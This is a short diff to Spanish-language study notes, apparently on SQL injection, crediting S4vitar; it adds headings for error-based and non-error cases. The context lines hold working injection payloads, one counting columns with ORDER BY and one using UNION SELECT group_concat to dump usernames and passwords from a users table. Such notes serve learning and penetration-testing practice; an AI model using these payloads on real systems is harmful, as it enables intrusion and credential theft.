@@ -10,6 +10,8 @@
 
 #### S4vitar
 
+##### En caso de que se nos muestre error en la respuesta
+
 Lo primero que hay que determinar es el numero de columnas que hay para eso usaremos
 `' order by X-- -`
 
@@ -38,6 +40,8 @@ En caso de que quiera enumera una base de datos diferente
 Para concatenar datos de una tabla con `:` como separados en hexadecimal `0x3A`
 `' union select group_concat(username,0x3A,password) from users-- -`
 
+
+##### En caso de que no se nos muestre error
 
 
 
